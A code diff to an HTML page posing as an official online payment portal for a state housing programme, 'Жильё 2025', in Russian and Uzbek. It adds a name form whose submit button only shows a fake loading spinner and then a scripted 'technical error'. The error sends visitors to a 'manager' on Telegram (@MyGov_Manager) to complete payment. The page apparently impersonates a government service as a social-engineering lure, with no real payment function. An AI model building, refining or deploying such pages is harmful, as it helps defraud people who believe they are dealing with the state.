@@ -19,6 +19,21 @@
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
       border-radius: 12px;
     }
+    .lang-switcher {
+      text-align: right;
+      margin-bottom: 10px;
+    }
+    .lang-switcher button {
+      margin-left: 5px;
+      padding: 6px 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      background-color: #f9f9f9;
+      cursor: pointer;
+    }
+    .lang-switcher button:hover {
+      background-color: #e0e0e0;
+    }
     header {
       text-align: center;
       margin-bottom: 2rem;
@@ -38,6 +53,55 @@
       color: #555;
       margin: 5px 0 25px;
     }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 500;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+    button.submit {
+      background-color: #1a73e8;
+      color: white;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    button.submit:hover {
+      background-color: #1669c1;
+    }
+    .hidden {
+      display: none;
+    }
+    #loading {
+      text-align: center;
+      font-size: 16px;
+      color: #555;
+      margin-top: 20px;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1a73e8;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 10px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
     .error-box {
       background: #fff3f3;
       border: 1px solid #f5c2c7;
@@ -45,6 +109,7 @@
       border-radius: 8px;
       color: #842029;
       font-size: 15px;
+      margin-top: 20px;
     }
     .error-box h3 {
       margin-top: 0;
@@ -64,21 +129,98 @@
 </head>
 <body>
   <div class="container">
+    <div class="lang-switcher">
+      <button onclick="switchLang('ru')">🇷🇺 RU</button>
+      <button onclick="switchLang('uz')">🇺🇿 UZ</button>
+    </div>
     <header>
       <img src="IMG_6512.PNG" alt="Герб" class="logo">
-      <h1>Портал онлайн-оплаты</h1>
-      <h2>Государственная программа "Жильё 2025"</h2>
+      <h1 id="title">Портал онлайн-оплаты</h1>
+      <h2 id="subtitle">Государственная программа «Жильё 2025»</h2>
     </header>
 
-    <div class="error-box">
-      <h3>⚠️ Техническая ошибка</h3>
-      <p>К сожалению, автоматическая система оплаты временно недоступна из-за высокой нагрузки.</p>
-      <p>Ваши данные были сохранены. Для завершения оплаты, пожалуйста, свяжитесь с уполномоченным менеджером.</p>
+    <form id="stepForm">
+      <label id="fioLabel">Введите ваше ФИО</label>
+      <input type="text" id="fioInput" placeholder="Иванов Иван Иванович" required>
+      <button class="submit" type="submit" id="continueBtn">Продолжить</button>
+    </form>
+
+    <div id="loading" class="hidden">
+      <p id="loadingText">🔄 Загружается платёжная информация...</p>
+      <div class="spinner"></div>
+    </div>
+
+    <div class="error-box hidden" id="errorBox">
+      <h3 id="errorTitle">⚠️ Техническая ошибка</h3>
+      <p id="errorMsg1">К сожалению, автоматическая система оплаты временно недоступна из-за высокой нагрузки.</p>
+      <p id="errorMsg2">Ваши данные были сохранены. Для завершения оплаты, пожалуйста, свяжитесь с уполномоченным менеджером.</p>
     </div>
 
     <div class="contact">
-      <p>👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Перейти в Telegram</a></p>
+      <p id="contactLink">👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Перейти в Telegram</a></p>
     </div>
   </div>
+<script>
+  const form = document.getElementById('stepForm');
+  const loading = document.getElementById('loading');
+  const errorBox = document.getElementById('errorBox');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    form.classList.add('hidden');
+    loading.classList.remove('hidden');
+
+    setTimeout(() => {
+      loading.classList.add('hidden');
+      errorBox.classList.remove('hidden');
+    }, 3000);
+  });
+
+  const langs = {
+    ru: {
+      title: 'Портал онлайн-оплаты',
+      subtitle: 'Государственная программа «Жильё 2025»',
+      fioLabel: 'Введите ваше ФИО',
+      placeholder: 'Иванов Иван Иванович',
+      button: 'Продолжить',
+      loading: '🔄 Загружается платёжная информация...',
+      errorTitle: '⚠️ Техническая ошибка',
+      errorMsg1: 'К сожалению, автоматическая система оплаты временно недоступна из-за высокой нагрузки.',
+      errorMsg2: 'Ваши данные были сохранены. Для завершения оплаты, пожалуйста, свяжитесь с уполномоченным менеджером.',
+      contact: '👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Перейти в Telegram</a>'
+    },
+    uz: {
+      title: 'Onlayn toʻlov portali',
+      subtitle: '"Uy-joy 2025" davlat dasturi',
+      fioLabel: 'Toʻliq F.I.Sh. kiriting',
+      placeholder: 'Aliyev Alisher Akmal oʻgʻli',
+      button: 'Davom etish',
+      loading: '🔄 Toʻlov maʼlumotlari yuklanmoqda...',
+      errorTitle: '⚠️ Texnik xatolik',
+      errorMsg1: 'Afsuski, toʻlov tizimi vaqtincha mavjud emas.',
+      errorMsg2: 'Maʼlumotlaringiz saqlandi. Toʻlovni yakunlash uchun menejer bilan bogʻlaning.',
+      contact: '👤 <a href="https://t.me/MyGov_Manager" target="_blank">@MyGov_Manager — Telegram orqali bogʻlanish</a>'
+    }
+  };
+
+  function switchLang(lang) {
+    const t = langs[lang];
+    document.getElementById('title').textContent = t.title;
+    document.getElementById('subtitle').textContent = t.subtitle;
+    document.getElementById('fioLabel').textContent = t.fioLabel;
+    document.getElementById('fioInput').placeholder = t.placeholder;
+    document.getElementById('continueBtn').textContent = t.button;
+    document.getElementById('loadingText').textContent = t.loading;
+    document.getElementById('errorTitle').textContent = t.errorTitle;
+    document.getElementById('errorMsg1').textContent = t.errorMsg1;
+    document.getElementById('errorMsg2').textContent = t.errorMsg2;
+    document.getElementById('contactLink').innerHTML = t.contact;
+    localStorage.setItem('lang', lang);
+  }
+
+  // применяем сохранённый язык
+  const savedLang = localStorage.getItem('lang');
+  if (savedLang && langs[savedLang]) switchLang(savedLang);
+</script>
 </body>
 </html>
